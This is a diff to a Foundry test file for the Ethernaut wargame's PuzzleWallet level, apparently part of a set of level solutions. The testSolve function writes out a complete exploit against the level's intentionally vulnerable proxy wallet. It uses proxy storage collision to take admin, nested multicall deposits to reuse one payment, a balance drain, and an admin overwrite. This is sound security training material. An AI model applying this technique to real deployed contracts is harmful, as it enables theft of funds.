@@ -4,14 +4,14 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Delegation} from "src/levels/Delegation.sol";
-import {DelegationFactory} from "src/levels/DelegationFactory.sol";
+import {PuzzleWallet, PuzzleProxy} from "src/levels/PuzzleWallet.sol";
+import {PuzzleWalletFactory} from "src/levels/PuzzleWalletFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-contract TestDelegation is Test, Utils {
+contract TestPuzzleWallet is Test, Utils {
     Ethernaut ethernaut;
-    Delegation instance;
+    PuzzleWallet instance;
 
     address payable owner;
     address payable player;
@@ -31,12 +31,12 @@ contract TestDelegation is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        DelegationFactory factory = new DelegationFactory();
+        PuzzleWalletFactory factory = new PuzzleWalletFactory();
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
+        instance = PuzzleWallet(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
         vm.stopPrank();
     }
 
@@ -46,7 +46,7 @@ contract TestDelegation is Test, Utils {
 
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
-        vm.prank(player);
+        vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
 
@@ -54,8 +54,20 @@ contract TestDelegation is Test, Utils {
     function testSolve() public {
         vm.startPrank(player);
 
-        (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
-        require(success, "call not successful");
+        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);
+
+        instance.addToWhitelist(player);
+
+        bytes[] memory callsDeep = new bytes[](1);
+        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+
+        bytes[] memory calls = new bytes[](2);
+        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
+        instance.multicall{value: 0.001 ether}(calls);
+
+        instance.execute(player, 0.002 ether, "");
+        instance.setMaxBalance(uint256(uint160(address(player))));
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
